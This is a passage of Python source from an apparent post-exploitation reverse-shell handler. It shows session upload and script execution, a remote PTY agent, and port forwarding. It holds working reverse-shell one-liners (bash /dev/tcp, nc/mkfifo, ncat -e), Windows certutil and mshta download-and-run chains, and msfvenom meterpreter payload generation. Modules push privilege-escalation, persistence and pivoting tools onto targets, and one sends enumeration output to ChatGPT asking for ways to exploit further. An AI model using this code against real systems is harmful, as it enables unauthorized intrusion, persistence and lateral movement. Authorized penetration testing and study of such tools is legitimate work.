		elif self.OS == 'Windows':
			tempfile_zip = f'/dev/shm/{rand(16)}.zip'
			tempfile_bat = f'/dev/shm/{rand(16)}.bat'
			with zipfile.ZipFile(tempfile_zip, 'w') as myzip:
				altnames = []
				for item in resolved_items:
					if isinstance(item, tuple):
						filename, data = item
						if randomize_fname:
							filename = Path(filename)
							altname = f"{filename.stem}-{rand(8)}{filename.suffix}"
						else:
							altname = filename
						zip_info = zipfile.ZipInfo(filename=str(altname))
						zip_info.date_time = time.localtime(time.time())[:6]
						myzip.writestr(zip_info, data)
					else:
						altname = f"{item.stem}-{rand(8)}{item.suffix}" if randomize_fname else item.name
						myzip.write(item, arcname=altname)
					altnames.append(altname)

			server = FileServer(host=self._host, url_prefix=rand(8), quiet=True)
			urlpath_zip = server.add(tempfile_zip)

			cwd_escaped = self.cwd.replace('\\', '\\\\')
			tmp_escaped = self.tmp.replace('\\', '\\\\')
			temp_remote_file_zip = urlpath_zip.split("/")[-1]

			fetch_cmd = f'certutil -urlcache -split -f "http://{self._host}:{server.port}{urlpath_zip}" "%TEMP%\\{temp_remote_file_zip}" && echo DOWNLOAD OK'
			unzip_cmd = f'mshta "javascript:var sh=new ActiveXObject(\'shell.application\'); var fso = new ActiveXObject(\'Scripting.FileSystemObject\'); sh.Namespace(\'{cwd_escaped}\').CopyHere(sh.Namespace(\'{tmp_escaped}\\\\{temp_remote_file_zip}\').Items(), 16); while(sh.Busy) {{WScript.Sleep(100);}} fso.DeleteFile(\'{tmp_escaped}\\\\{temp_remote_file_zip}\');close()" && echo UNZIP OK'

			with open(tempfile_bat, "w") as f:
				f.write(fetch_cmd + "\n")
				f.write(unzip_cmd)

			urlpath_bat = server.add(tempfile_bat)
			temp_remote_file_bat = urlpath_bat.split("/")[-1]
			server.start()
			response = self.exec(
				f'certutil -urlcache -split -f "http://{self._host}:{server.port}{urlpath_bat}" "%TEMP%\\{temp_remote_file_bat}"&"%TEMP%\\{temp_remote_file_bat}"&del "%TEMP%\\{temp_remote_file_bat}"',
				force_cmd=True, value=True, timeout=None)
			server.stop()
			if not response:
				logger.error("Upload initialization failed...")
				return []
			if not "DOWNLOAD OK" in response:
				logger.error("Data transfer failed...")
				return []
			if not "UNZIP OK" in response:
				logger.error("Data unpacking failed...")
				return []

		# Present uploads
		uploaded_paths = []
		for item in altnames:
			if self.OS == "Unix":
				uploaded_path = shlex.quote(str(Path(destination) / item))
			elif self.OS == "Windows":
				uploaded_path = f'"{PureWindowsPath(destination, item)}"'
			logger.info(f"{paint('Upload OK').GREEN_white} {paint(uploaded_path).yellow}")
			uploaded_paths.append(uploaded_path)
			print()

		return uploaded_paths

	@agent_only
	def script(self, local_script):

		local_script_folder = self.directory / "scripts"
		prefix = datetime.now().strftime("%Y_%m_%d-%H_%M_%S-")

		try:
			local_script_folder.mkdir(parents=True, exist_ok=True)
		except Exception as e:
			logger.error(e)
			return False

		if re.match(r'(http|ftp)s?://', local_script, re.IGNORECASE):
			try:
				filename, data = url_to_bytes(local_script)
				if not data:
					return False
			except Exception as e:
				logger.error(e)

			local_script = local_script_folder / (prefix + filename)
			with open(local_script, "wb") as input_file:
				input_file.write(data)
		else:
			local_script = Path(normalize_path(local_script))

		output_file_name = local_script_folder / (prefix + "output.txt")

		try:
			input_file = open(local_script, "rb")
			output_file = open(output_file_name, "wb")
			first_line = input_file.readline().strip()
			#input_file.seek(0) # Maybe it is not needed
			if first_line.startswith(b'#!'):
				program = first_line[2:].decode()
			else:
				logger.error("No shebang found")
				return False

			tail_cmd = f'tail -n+0 -f {output_file_name}'
			print(tail_cmd)
			Open(tail_cmd, terminal=True)

			thread = threading.Thread(target=self.exec, args=(program, ), kwargs={
				'stdin_src': input_file,
				'stdout_dst': output_file,
				'stderr_dst': output_file
			})
			thread.start()

		except Exception as e:
			logger.error(e)
			return False

		return output_file_name

	def spawn(self, port=None, host=None):

		if self.OS == "Unix":
			if any([self.listener, port, host]):

				port = port or self._port
				host = host or self._host

				if not next((listener for listener in core.listeners.values() if listener.port == port), None):
					new_listener = TCPListener(host, port)

				if self.bin['bash']:
					cmd = f'printf "(bash >& /dev/tcp/{host}/{port} 0>&1) &"|bash'
				elif self.bin['nc'] and self.bin['sh']:
					cmd = f'printf "(rm /tmp/_;mkfifo /tmp/_;cat /tmp/_|sh 2>&1|nc {host} {port} >/tmp/_) &"|sh'
				elif self.bin['sh']:
					ncat_cmd = f'{self.bin["sh"]} -c "{self.bin["setsid"]} {{}} -e {self.bin["sh"]} {host} {port} &"'
					ncat_binary = self.tmp + '/ncat'
					if not self.exec(f"test -f {ncat_binary} || echo x"):
						cmd = ncat_cmd.format(ncat_binary)
					else:
						logger.warning("ncat is not available on the target")
						ncat_binary = self.need_binary(
							"ncat",
							URLS['ncat']
							)
						if ncat_binary:
							cmd = ncat_cmd.format(ncat_binary)
						else:
							logger.error("Spawning shell aborted")
							return False
				else:
					logger.error("No available shell binary is present...")
					return False

				logger.info(f"Attempting to spawn a reverse shell on {host}:{port}")
				self.exec(cmd)

				# TODO maybe destroy the new_listener upon getting a shell?
				# if new_listener:
				#	new_listener.stop()
			else:
				host, port = self.socket.getpeername()
				logger.info(f"Attempting to spawn a bind shell from {host}:{port}")
				if not Connect(host, port):
					logger.info("Spawn bind shell failed. I will try getting a reverse shell...")
					return self.spawn(port, self._host)

		elif self.OS == 'Windows':
			logger.warning("Spawn Windows shells is not implemented yet")
			return False

		return True

	@agent_only
	def portfwd(self, _type, lhost, lport, rhost, rport):

		session = self
		control = ControlQueue()
		stop = threading.Event()
		task = [(_type, lhost, lport, rhost, rport), control, stop]

		class ThreadedTCPRequestHandler(socketserver.BaseRequestHandler):
			def handle(self):

				self.request.setblocking(False)
				stdin_stream = session.new_streamID
				stdout_stream = session.new_streamID
				stderr_stream = session.new_streamID

				if not all([stdin_stream, stdout_stream, stderr_stream]):
					return

				code = rf"""
				import socket
				client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				frlist = [stdin_stream]
				connected = False
				while True:
					readables, _, _ = select(frlist, [], [])

					for readable in readables:
						if readable is stdin_stream:
							data = stdin_stream.read({options.network_buffer_size})
							if not connected:
								client.connect(("{rhost}", {rport}))
								client.setblocking(False)
								frlist.append(client)
								connected = True
							try:
								client.sendall(data)
							except OSError:
								break
							if not data:
								frlist.remove(stdin_stream)
								break
						if readable is client:
							try:
								data = client.recv({options.network_buffer_size})
								stdout_stream.write(data)
								if not data:
									frlist.remove(client) # TEMP
									break
							except OSError:
								frlist.remove(client) # TEMP
								break
					else:
						continue
					break
				#client.shutdown(socket.SHUT_RDWR)
				client.close()
				"""
				session.exec(
					code,
					python=True,
					stdin_stream=stdin_stream,
					stdout_stream=stdout_stream,
					stderr_stream=stderr_stream,
					stdin_src=self.request,
					stdout_dst=self.request,
					agent_control=control
				)
				os.close(stderr_stream._read) #TEMP

		class ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
			allow_reuse_address = True
			request_queue_size = 100

			@handle_bind_errors
			def server_bind(self, lhost, lport):
				self.server_address = (lhost, int(lport))
				super().server_bind()

		def server_thread():
			with ThreadedTCPServer(None, ThreadedTCPRequestHandler, bind_and_activate=False) as server:
				if not server.server_bind(lhost, lport):
					return False
				server.server_activate()
				task.append(server)
				logger.info(f"Setup Port Forwarding: {lhost}:{lport} {'->' if _type=='L' else '<-'} {rhost}:{rport}")
				session.tasks['portfwd'].append(task)
				server.serve_forever()
			stop.set()

		portfwd_thread = threading.Thread(target=server_thread)
		task.append(portfwd_thread)
		portfwd_thread.start()

	def maintain(self):
		with core.lock:
			current_num = len(core.hosts[self.name]) if core.hosts else 0
			if 0 < current_num < options.maintain:
				session = core.hosts[self.name][-1]
				logger.warning(paint(
						f" --- Session {session.id} is trying to maintain {options.maintain} "
						f"active shells on {self.name} ---"
					).blue)
				return session.spawn()
			return True
		return False

	def kill(self):
		if self not in core.rlist:
			return True

		if menu.sid == self.id:
			menu.set_id(None)

		thread_name = threading.current_thread().name
		logger.debug(f"Thread <{thread_name}> wants to kill session {self.id}")

		if thread_name != 'Core':
			if self.OS:
				if self.host_needs_control_session and\
					not self.spare_control_sessions and\
					self.control_session is self:

					sessions = ', '.join([str(session.id) for session in self.host_needs_control_session])
					logger.warning(f"Cannot kill Session {self.id} as the following sessions depend on it: [{sessions}]")
					return False

				for module in modules().values():
					if module.enabled and module.on_session_end:
						module.run(self, None)
			else:
				self.id = randint(10**10, 10**11-1)
				core.sessions[self.id] = self

			core.control << f'self.sessions[{self.id}].kill()'
			return

		self.subchannel.control.close()
		self.subchannel.close()

		core.rlist.remove(self)
		if self in core.wlist:
			core.wlist.remove(self)
		try:
			self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack("ii", 1, 0)) # RST
			#self.socket.shutdown(socket.SHUT_RDWR) # FIN
		except OSError:
			pass
		self.socket.close()

		if not self.OS:
			message = f"Invalid shell from {self.ip} {EMOJIS['invalid_shell']}"
		else:
			message = f"Session [{self.id}] died..."
			core.hosts[self.name].remove(self)
			if not core.hosts[self.name]:
				message += f" We lost {self.name_colored} {EMOJIS['lost']}"
				del core.hosts[self.name]

		if self.id in core.sessions:
			del core.sessions[self.id]
		logger.error(message)

		if hasattr(self, 'logfile'):
			self.logfile.close()

		if self.is_attached:
			self.detach()

		for portfwd in self.tasks['portfwd']:
			info, control, stop, thread, server = portfwd
			logger.warning(f"Stopping Port Forwarding: {info[1]}:{info[2]} {'->' if info[0]=='L' else '<-'} {info[3]}:{info[4]}")
			server.shutdown()
			server.server_close()
			while not stop.is_set(): # TEMP
				control << "stop"
			thread.join()

		if self.OS:
			threading.Thread(target=self.maintain).start()
		return True


class Messenger:
	SHELL = 1
	RESIZE = 2
	EXEC = 3
	STREAM = 4

	STREAM_CODE = '!H'
	STREAM_BYTES = struct.calcsize(STREAM_CODE)

	LEN_CODE = 'H'
	_LEN_CODE = '!' + 'H'
	LEN_BYTES = struct.calcsize(LEN_CODE)

	TYPE_CODE = 'B'
	_TYPE_CODE = '!' + 'B'
	TYPE_BYTES = struct.calcsize(TYPE_CODE)

	HEADER_CODE = '!' + LEN_CODE + TYPE_CODE

	def __init__(self, bufferclass):
		self.len = None
		self.input_buffer = bufferclass()
		self.length_buffer = bufferclass()
		self.message_buffer = bufferclass()

	def message(_type, _data):
		return struct.pack(Messenger.HEADER_CODE, len(_data) + Messenger.TYPE_BYTES, _type) + _data
	message = staticmethod(message)

	def feed(self, data):
		self.input_buffer.write(data)
		self.input_buffer.seek(0)

		while True:
			if not self.len:
				len_need = Messenger.LEN_BYTES - self.length_buffer.tell()
				data = self.input_buffer.read(len_need)
				self.length_buffer.write(data)
				if len(data) != len_need:
					break

				self.len = struct.unpack(Messenger._LEN_CODE, self.length_buffer.getvalue())[0]
				self.length_buffer.seek(0)
				self.length_buffer.truncate()
			else:
				data_need = self.len - self.message_buffer.tell()
				data = self.input_buffer.read(data_need)
				self.message_buffer.write(data)
				if len(data) != data_need:
					break

				self.message_buffer.seek(0)
				_type = struct.unpack(Messenger._TYPE_CODE, self.message_buffer.read(Messenger.TYPE_BYTES))[0]
				_message = self.message_buffer.read()

				self.len = None
				self.message_buffer.seek(0)
				self.message_buffer.truncate()
				yield _type, _message

		self.input_buffer.seek(0)
		self.input_buffer.truncate()

class Stream:
	def __init__(self, _id, _session=None):
		self.id = _id
		self._read, self._write = os.pipe()
		self.writebuf = None
		self.feed_thread = None
		self.session = _session

		if self.session is None:
			self.writefunc = lambda data: respond(self.id + data)
			cloexec(self._write)
			cloexec(self._read)
		else:
			self.writefunc = lambda data: self.session.send(Messenger.message(Messenger.STREAM, self.id + data))

	def __lshift__(self, data):
		if not self.writebuf:
			self.writebuf = queue.Queue()
		self.writebuf.put(data)
		if not self.feed_thread:
			self.feed_thread = threading.Thread(target=self.feed, name="feed stream -> " + repr(self.id))
			self.feed_thread.start()

	def feed(self):
		while True:
			data = self.writebuf.get()
			if not data:
				try:
					os.close(self._write)
				except:
					pass
				break
			try:
				os.write(self._write, data)
			except:
				break

	def fileno(self):
		return self._read

	def write(self, data):
		self.writefunc(data)

	def read(self, n):
		try:
			data = os.read(self._read, n)
		except:
			return "".encode()
		if not data:
			try:
				os.close(self._read)
			except:
				pass
		return data

def agent():
	import os
	import sys
	import pty
	import shlex
	import fcntl
	import struct
	import signal
	import termios
	import threading
	from select import select
	signal.signal(signal.SIGINT, signal.SIG_DFL)
	signal.signal(signal.SIGQUIT, signal.SIG_DFL)
	normalize_path = lambda path: os.path.normpath(os.path.expandvars(os.path.expanduser(path)))

	if sys.version_info[0] == 2:
		import Queue as queue
	else:
		import queue
	try:
		import io
		bufferclass = io.BytesIO
	except:
		import StringIO
		bufferclass = StringIO.StringIO

	SHELL = "{}"
	NET_BUF_SIZE = {}
	{}
	{}

	def respond(_value, _type=Messenger.STREAM):
		wlock.acquire()
		outbuf.seek(0, 2)
		outbuf.write(Messenger.message(_type, _value))
		if not pty.STDOUT_FILENO in wlist:
			wlist.append(pty.STDOUT_FILENO)
			os.write(control_in, "1".encode())
		wlock.release()

	def cloexec(fd):
		try:
			flags = fcntl.fcntl(fd, fcntl.F_GETFD)
			fcntl.fcntl(fd, fcntl.F_SETFD, flags | fcntl.FD_CLOEXEC)
		except:
			pass

	shell_pid, master_fd = pty.fork()
	if shell_pid == pty.CHILD:
		os.execl(SHELL, SHELL, '-i')
	try:
		pty.setraw(pty.STDIN_FILENO)
	except:
		pass

	try:
		streams = dict()
		messenger = Messenger(bufferclass)
		outbuf = bufferclass()
		ttybuf = bufferclass()

		wlock = threading.Lock()
		control_out, control_in = os.pipe()
		cloexec(control_out)
		cloexec(control_in)

		rlist = [control_out, master_fd, pty.STDIN_FILENO]
		wlist = []
		for fd in (master_fd, pty.STDIN_FILENO, pty.STDOUT_FILENO, pty.STDERR_FILENO): # TODO
			flags = fcntl.fcntl(fd, fcntl.F_GETFL)
			fcntl.fcntl(fd, fcntl.F_SETFL, flags | os.O_NONBLOCK)
			cloexec(fd)

		while True:
			rfds, wfds, _ = select(rlist, wlist, [])

			for readable in rfds:
				if readable is control_out:
					os.read(control_out, 1)

				elif readable is master_fd:
					try:
						data = os.read(master_fd, NET_BUF_SIZE)
					except:
						data = ''.encode()
					respond(data, Messenger.SHELL)
					if not data:
						rlist.remove(master_fd)
						try:
							os.close(master_fd)
						except:
							pass

				elif readable is pty.STDIN_FILENO:
					try:
						data = os.read(pty.STDIN_FILENO, NET_BUF_SIZE)
					except:
						data = None
					if not data:
						rlist.remove(pty.STDIN_FILENO)
						break

					messages = messenger.feed(data)
					for _type, _value in messages:
						if _type == Messenger.SHELL:
							ttybuf.seek(0, 2)
							ttybuf.write(_value)
							if not master_fd in wlist:
								wlist.append(master_fd)

						elif _type == Messenger.RESIZE:
							fcntl.ioctl(master_fd, termios.TIOCSWINSZ, _value)

						elif _type == Messenger.EXEC:
							sb = str(Messenger.STREAM_BYTES)
							header_size = 1 + int(sb) * 3
							__type, stdin_stream_id, stdout_stream_id, stderr_stream_id = struct.unpack(
								'!c' + (sb + 's') * 3,
								_value[:header_size]
							)
							cmd = _value[header_size:]

							if not stdin_stream_id in streams:
								streams[stdin_stream_id] = Stream(stdin_stream_id)
							if not stdout_stream_id in streams:
								streams[stdout_stream_id] = Stream(stdout_stream_id)
							if not stderr_stream_id in streams:
								streams[stderr_stream_id] = Stream(stderr_stream_id)

							stdin_stream = streams[stdin_stream_id]
							stdout_stream = streams[stdout_stream_id]
							stderr_stream = streams[stderr_stream_id]

							rlist.append(stdout_stream)
							rlist.append(stderr_stream)

							if __type == 'S'.encode():
								pid = os.fork()
								if pid == 0:
									os.dup2(stdin_stream._read, 0)
									os.dup2(stdout_stream._write, 1)
									os.dup2(stderr_stream._write, 2)
									os.execl("{}", "sh", "-c", cmd)
									os._exit(1)
								os.close(stdin_stream._read)
								os.close(stdout_stream._write)
								os.close(stderr_stream._write)

							elif __type == 'P'.encode():
								def run(stdin_stream, stdout_stream, stderr_stream):
									try:
										{}
									except:
										stderr_stream << (str(sys.exc_info()[1]) + "\n").encode()
									try:
										os.close(stdin_stream._read)
									except:
										pass

									#if stdin_stream_id in streams:
									#	del streams[stdin_stream_id]
									stdout_stream << "".encode()
									stderr_stream << "".encode()
								threading.Thread(target=run, args=(stdin_stream, stdout_stream, stderr_stream)).start()

						# Incoming streams
						elif _type == Messenger.STREAM:
							stream_id, data = _value[:Messenger.STREAM_BYTES], _value[Messenger.STREAM_BYTES:]
							if not stream_id in streams:
								streams[stream_id] = Stream(stream_id)
							streams[stream_id] << data

				# Outgoing streams
				else:
					data = readable.read(NET_BUF_SIZE)
					readable.write(data)
					if not data:
						rlist.remove(readable)
						del streams[readable.id]

			else:
				for writable in wfds:

					if writable is pty.STDOUT_FILENO:
						sendbuf = outbuf
						wlock.acquire()

					elif writable is master_fd:
						sendbuf = ttybuf

					try:
						sent = os.write(writable, sendbuf.getvalue())
					except OSError:
						wlist.remove(writable)
						if sendbuf is outbuf:
							wlock.release()
						continue

					sendbuf.seek(sent)
					remaining = sendbuf.read()
					sendbuf.seek(0)
					sendbuf.truncate()
					sendbuf.write(remaining)
					if not remaining:
						wlist.remove(writable)
					if sendbuf is outbuf:
						wlock.release()
				continue
			break
	except:
		_, e, t = sys.exc_info()
		import traceback
		traceback.print_exc()
		traceback.print_stack()
	try:
		os.close(master_fd)
	except:
		pass
	os.waitpid(shell_pid, 0)[1]
	os.kill(os.getppid(), signal.SIGKILL) # TODO


def modules():
	mods = {module.__name__:module for module in Module.__subclasses__()}
	if options.oscp_safe:
		del mods['meterpreter']
		del mods['traitor']
	return mods


class Module:
	enabled = True
	on_session_start = False
	on_session_end = False
	category = "Misc"


class upload_privesc_scripts(Module):
	category = "Privilege Escalation"
	def run(session, args):
		"""
		Upload {linpeas,lse,deepce,pspy|winpeas,powerup,privesccheck} to the target
		"""
		if session.OS == 'Unix':
			session.upload(URLS['linpeas'])
			session.upload(URLS['lse'])
			session.upload(URLS['deepce'])

			if session.arch == "x86_64":
				session.upload(URLS['pspy64'])
			elif session.arch in ("i386", "i686"):
				session.upload(URLS['pspy32'])
			else:
				logger.error("pspy: No compatible binary architecture")
				print()

		elif session.OS == 'Windows':
			session.upload(URLS['winpeas'])
			session.upload(URLS['powerup'])
			session.upload(URLS['privesccheck'])


class peass_ng(Module):
	category = "Privilege Escalation"
	def run(session, args):
		"""
		Run the latest version of PEASS-ng in the background
		"""
		if session.OS == 'Unix':
			parser = ArgumentParser(prog='peass_ng', description="peass-ng module", add_help=False)
			parser.add_argument("-a", "--ai", help="Analyze linpeas results with chatGPT", action="store_true")

			try:
				arguments = parser.parse_args(shlex.split(args))
			except SystemExit:
				return

			if arguments.ai:
				if options.oscp_safe:
					logger.error("AI is not allowed in OSCP")
					return
				try:
					from openai import OpenAI
					#api_key = input("Please enter your chatGPT API key: ")
					#assert len(api_key) > 10
				except Exception as e:
					logger.error(e)
					return False

			output_file = session.script(URLS['linpeas'])

			if arguments.ai:
				api_key = input("Please enter your chatGPT API key: ")
				assert len(api_key) > 10

				with open(output_file, "r") as file:
					content = file.read()

				client = OpenAI(api_key=api_key)
				stream = client.chat.completions.create(
				    model="gpt-4o-mini",
				    messages=[
					{"role": "system", "content": "You are a helpful assistant helping me to perform penetration test to protect the systems"},
					{
					    "role": "user",
					    "content": f"I am pasting here the results of linpeas. Based on the output, I want you to tell me all possible ways the further exploit this system. I want you to be very specific on your analysis and not write generalities and uneccesary information. I want to focus only on your specific suggestions.\n\n\n {content}"
					}
				    ],
				stream=True
				)

				print('\n═════════════════ chatGPT analysis START ════════════════')
				for chunk in stream:
					if chunk.choices[0].delta.content:
						#print(chunk.choices[0].delta.content, end="", flush=True)
						stdout(chunk.choices[0].delta.content.encode())
				print('\n═════════════════ chatGPT analysis END ════════════════')

		elif session.OS == 'Windows':
			logger.error("This module runs only on Unix shells")
			while True:
				answer = ask(f"Use {paint('upload_privesc_scripts').GREY_white}{paint(' instead? (Y/n): ').yellow}").lower()
				if answer in ('y', ''):
					menu.do_run('upload_privesc_scripts')
					break
				elif answer == 'n':
					break


class lse(Module):
	category = "Privilege Escalation"
	def run(session, args):
		"""
		Run the latest version of linux-smart-enumeration in the background
		"""
		if session.OS == 'Unix':
			session.script(URLS['lse'])
		else:
			logger.error("This module runs only on Unix shells")


class linuxexploitsuggester(Module):
	category = "Privilege Escalation"
	def run(session, args):
		"""
		Run the latest version of linux-exploit-suggester in the background
		"""
		if session.OS == 'Unix':
			session.script(URLS['les'])
		else:
			logger.error("This module runs only on Unix shells")


class traitor(Module):
	category = "Privilege Escalation"
	def run(session, args):
		"""
		Upload the latest version of Traitor
		"""
		if session.OS == 'Unix':
			if session.arch == "x86_64":
				session.upload(URLS['traitor_amd64'])
			elif session.arch in ("i386", "i686"):
				session.upload(URLS['traitor_386'])
			elif session.arch in ("aarch64", "arm64"):
				session.upload(URLS['traitor_arm64'])
			else:
				logger.error("Traitor: No compatible binary architecture")
				print()

		elif session.OS == 'Windows':
			logger.error("This module runs only on Unix shells")


class panix(Module):
	category = "Persistence"
	def run(session, args):
		"""
		Upload the latest version of panix to the target
		"""
		if session.OS == 'Unix':
			session.upload(URLS['panix'])
		else:
			logger.error("This module runs only on Unix shells")


class meterpreter(Module):
	def run(session, args):
		"""
		Get a meterpreter shell
		"""
		if session.OS == 'Unix':
			logger.error("This module runs only on Windows shells")
		else:
			payload_path = f"/dev/shm/{rand(10)}.exe"
			host = session._host
			port = 5555
			payload_creation_cmd = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={host} LPORT={port} -f exe > {payload_path}"
			result = subprocess.run(payload_creation_cmd, shell=True, text=True, capture_output=True)

			if result.returncode == 0:
				logger.info("Payload created!")
				uploaded_path = session.upload(payload_path)
				if uploaded_path:
					meterpreter_handler_cmd = (
						'msfconsole -x "use exploit/multi/handler; '
						'set payload windows/meterpreter/reverse_tcp; '
						f'set LHOST {host}; set LPORT {port}; run"'
					)
					Open(meterpreter_handler_cmd, terminal=True)
					print(meterpreter_handler_cmd)
					session.exec(uploaded_path[0])
			else:
				logger.error(f"Cannot create meterpreter payload: {result.stderr}")


class ligolo(Module):
	category = "Pivoting"
	def run(session, args):
		"""
		Upload the latest version of Ligolo-ng
		"""
		if session.OS == 'Unix':
			if session.arch == "x86_64":
				files = session.upload(URLS['ligolo_amd64'])
			elif session.arch in ("aarch64", "arm64"):
				files = session.upload(URLS['ligolo_arm64'])
			else:
				logger.error("Ligolo-ng: No predefined binary to upload. Please make a pull request.")
				print()
				return

			if files:
				session.exec(f"tar -xzf {files[0]} agent && rm {files[0]}")
				logger.info(f"Ligolo-ng agent decompressed!")

		elif session.OS == 'Windows':
			logger.error("Ligolo-ng: No predefined binary to upload. Please make a pull request.")


class chisel(Module):
	category = "Pivoting"
	def run(session, args):
		"""
		Upload the latest version of Chisel
		"""
		if session.OS == 'Unix':
			if session.arch == "x86_64":
				files = session.upload(URLS['chisel_amd64'])
			elif session.arch in ("i386", "i686"):
				files = session.upload(URLS['chisel_386'])
			elif session.arch in ("aarch64", "arm64"):
				files = session.upload(URLS['chisel_arm64'])
			else:
				logger.error("Chisel: No predefined binary to upload. Please make a pull request.")
				print()
				return

			if files:
				session.exec(f"gunzip {files[0]}")
				logger.info(f"{paint(files[0]).yellow} decompressed!")

		elif session.OS == 'Windows':
			logger.error("Chisel: No predefined binary to upload. Please make a pull request.")


class ngrok(Module):
	category = "Pivoting"
	def run(session, args):
		"""
		Setup and create a tcp tunnel using ngrok
		"""
		if session.OS == 'Unix':
			if not session.system == 'Linux':
				logger.error(f"This modules runs only on Linux, not on {session.system}.")
				return False
			session.upload(URLS['ngrok_linux'], remote_path=session.tmp)
			result = session.exec(f"tar xf {session.tmp}/ngrok-v3-stable-linux-amd64.tgz -C {session.tmp} >/dev/null", value=True)
			if not result:
				logger.info(f"ngrok successuly extracted on {session.tmp}")
			else:
				logger.error(f"Extraction to {session.tmp} failed:\n{indent(result, ' ' * 4 + '- ')}")
				return False
			token = input("Authtoken: ")
			session.exec(f"{session.tmp}/ngrok config add-authtoken {token}")
			logger.info("Provide a TCP port number to be exposed in ngrok cloud:")
			tcp_port = input("tcp_port: ")
			#logger.info("Indicate if a TCP or an HTTP tunnel is required?:")
			#tunnel = input("tunnel: ")
			cmd = f"cd {session.tmp}; ./ngrok tcp {tcp_port} --log=stdout"
			print(cmd)
			#session.exec(cmd)
			tf = f"/tmp/{rand(8)}"
			with open(tf, "w") as f:
				f.write("#!/bin/sh\n")
				f.write(cmd)
			logger.info(f"ngrok session open")
			session.script(tf)
		else:
			logger.error("This module runs only on Unix shells")


class uac(Module):
	category = "Forensics"
	def run(session, args):
		"""
		Acquire forensic data Unix systems using UAC (Unix-like Artifacts Collector) in the background
		"""
		if session.OS == 'Unix':
			if not session.system == 'Linux':
				logger.error(f"This modules runs only on Linux, not on {session.system}.")
				return False
			path = session.upload(URLS['uac_linux'], remote_path=session.tmp)[0]
			result = session.exec(f"tar xf {path} -C {session.tmp} >/dev/null", value=True)
			if not result:
				logger.info(f"UAC successfully extracted on {session.tmp}")
			else:
				logger.error(f"Extraction to {session.tmp} failed:\n{indent(result, ' ' * 4 + '- ')}")
				return False
		#	UAC artifacts or profiles can be set by changing the arguments, e.g.:  /uac -u -a './artifacts/live_response/network*' --output-format tar {session.tmp}
			logger.info(f"root user check is disabled. Data collection may be limited. It will WRITE the output on the remote file system.")
			cmd = f"cd {path.removesuffix('.tar.gz')}; ./uac -u -p ir_triage --output-format tar {session.tmp}"
			#session.exec(cmd)
			tf = f"/tmp/{rand(8)}"
			with open(tf, "w") as f:
				f.write("#!/bin/sh\n")
				f.write(cmd)
			logger.info(f"UAC output will be stored at {session.tmp}/uac-%hostname%-%os%-%timestamp%")
			session.script(tf)
		#	Once completed, transfer the output files to your host
		else:
			logger.error("This module runs only on Unix shells")


class linux_procmemdump(Module):
	category = "Forensics"
	def run(session, args):
		"""
		Dump process memory in the background (requires root)
		"""
		if session.OS == 'Unix':
			if not session.system == 'Linux':
				logger.error(f"This modules runs only on Linux, not on {session.system}.")
				return False
			session.upload(URLS['linux_procmemdump'], remote_path=session.tmp)
			print(session.exec(f"ps -eo pid,cmd", value=True))
			logger.info(f"Please provide the PID of the process to be acquired:")
			PID = input("PID: ")
			session.exec(f"{session.tmp}/linux_procmemdump.sh -p {PID} -s -d {session.tmp}")
			logger.info(f"Strings of the process dump will be stored at {session.tmp}/{PID}/")
		else:
			logger.error("This module runs only on Unix shells")


class FileServer:
	def __init__(self, *items, port=None, host=None, url_prefix=None, quiet=False):
		self.port = port or options.default_fileserver_port
		self.host = host or options.default_interface
		self.host = Interfaces().translate(self.host)
		self.items = items
		self.url_prefix = url_prefix + '/' if url_prefix else ''
		self.quiet = quiet
		self.filemap = {}
		for item in self.items:
			self.add(item)

	def add(self, item):
		if item == '/':
			self.filemap[f'/{self.url_prefix}[root]'] = '/'
			return '/[root]'

		item = os.path.abspath(normalize_path(item))

		if not os.path.exists(item):
			if not self.quiet:
				logger.warning(f"'{item}' does not exist and will be ignored.")
			return None

		if item in self.filemap.values():
			for _urlpath, _item in self.filemap.items():
				if _item == item:
					return _urlpath

		urlpath = f"/{self.url_prefix}{os.path.basename(item)}"
		while urlpath in self.filemap:
			root, ext = os.path.splitext(urlpath)
			urlpath = root + '_' + ext
		self.filemap[urlpath] = item
		return urlpath

	def remove(self, item):
		item = os.path.abspath(normalize_path(item))
		if item in self.filemap:
			del self.filemap[f"/{os.path.basename(item)}"]
		else:
			if not self.quiet:
				logger.warning(f"{item} is not served.")

	@property
	def links(self):
		output = []
		ips = [self.host]

		if self.host == '0.0.0.0':
			ips = [ip for ip in Interfaces().list.values()]

		for ip in ips:
			output.extend(('', f'{EMOJIS["home"]} http://' + str(paint(ip).cyan) + ":" + str(paint(self.port).red) + '/' + self.url_prefix))
			table = Table(joinchar=' → ')
			for urlpath, filepath in self.filemap.items():
				table += (
					paint(f"{EMOJIS['folder'] if os.path.isdir(filepath) else EMOJIS['file']} ").green +
					paint(f"http://{ip}:{self.port}{urlpath}").white_BLUE, filepath
				)
			output.append(str(table))
			output.append("─" * len(output[1]))

		return '\n'.join(output)

	def start(self):
		threading.Thread(target=self._start).start()

	def _start(self):
		filemap, host, port, url_prefix, quiet = self.filemap, self.host, self.port, self.url_prefix, self.quiet

		class CustomTCPServer(socketserver.TCPServer):
			allow_reuse_address = True

			def __init__(self, *args, **kwargs):
				self.client_sockets = []
				super().__init__(*args, **kwargs)

			@handle_bind_errors
			def server_bind(self, host, port):
				self.server_address = (host, int(port))
				super().server_bind()

			def process_request(self, request, client_address):
				self.client_sockets.append(request)
				super().process_request(request, client_address)

			def shutdown(self):
				for sock in self.client_sockets:
					try:
						sock.shutdown(socket.SHUT_RDWR)
						sock.close()
					except:
						pass
				super().shutdown()

		class CustomHandler(SimpleHTTPRequestHandler):
			def do_GET(self):
				try:
					if self.path == '/' + url_prefix:
						response = ''
						for path in filemap.keys():
							response += f'<li><a href="{path}">{path}</a></li>'
						response = response.encode()
						self.send_response(200)
						self.send_header("Content-type", "text/html")
						self.send_header("Content-Length", str(len(response)))
						self.end_headers()

						self.wfile.write(response)
					else:
						super().do_GET()
				except Exception as e:
					logger.error(e)

			def translate_path(self, path):
				path = path.split('?', 1)[0]
				path = path.split('#', 1)[0]
				try:
					path = unquote(path, errors='surrogatepass')
				except UnicodeDecodeError:
					path = unquote(path)
				path = os.path.normpath(path)

				for urlpath, filepath in filemap.items():
					if path == urlpath:
						return filepath
					elif path.startswith(urlpath):
						relpath = path[len(urlpath):].lstrip('/')
						return os.path.join(filepath, relpath)
				return ""

			def log_message(self, format, *args):
				if quiet:
					return None
				message = format % args
